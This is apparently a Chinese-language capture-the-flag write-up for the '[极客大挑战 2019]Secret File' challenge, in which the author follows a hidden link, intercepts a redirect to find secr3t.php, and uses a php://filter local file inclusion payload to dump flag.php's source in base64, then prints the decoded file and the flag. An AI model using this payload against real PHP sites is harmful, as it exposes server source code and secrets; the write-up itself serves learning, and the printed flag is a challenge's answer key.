# [极客大挑战 2019]Secret File  
TAG: PHP PHP伪协议 文件包含漏洞  
![20210108095155](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108095155.png)  
检查源代码，发现隐藏链接，访问：  
![20210108095708](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108095708.png)  
```./Archive_room.php```
![20210108095857](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108095857.png)  
![20210108100435](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108100435.png)  
尝试访问action.php,却跳转到end.php  
![20210108100521](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108100521.png)  
页面中提示我们没有看清，使用抓包工具抓包查看  
![20210108100549](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108100549.png)  
访问secr3t.php  
![20210108100654](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108100654.png)  
访问flag.php发现什么也没有，在secr3t.php中存在文件读取漏洞，尝试利用  
![20210108100719](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108100719.png)  
构造payload:```?file=php://filter/convert.base64-encode/resource=flag.php```  
![20210108100759](https://raw.githubusercontent.com/mrzhang76/MdPicture/master/20210108100759.png)  
```
PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7MTUyZmU3N2MtMzFhZS00MTM0LWIwNDEtY2U0ODI3Y2FkNGI2fSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=
```
解码结果：  
```
<!DOCTYPE html>

<html>

    <head>
        <meta charset="utf-8">
        <title>FLAG</title>
    </head>

    <body style="background-color:black;"><br><br><br><br><br><br>
        
        <h1 style="font-family:verdana;color:red;text-align:center;">啊哈！你找到我了！可是你看不到我QAQ~~~</h1><br><br><br>
        
        <p style="font-family:arial;color:red;font-size:20px;text-align:center;">
            <?php
                echo "我就在这里";
                $flag = 'flag{152fe77c-31ae-4134-b041-ce4827cad4b6}';
                $secret = 'jiAng_Luyuan_w4nts_a_g1rIfri3nd'
            ?>
        </p>
    </body>

</html>
```
获得flag  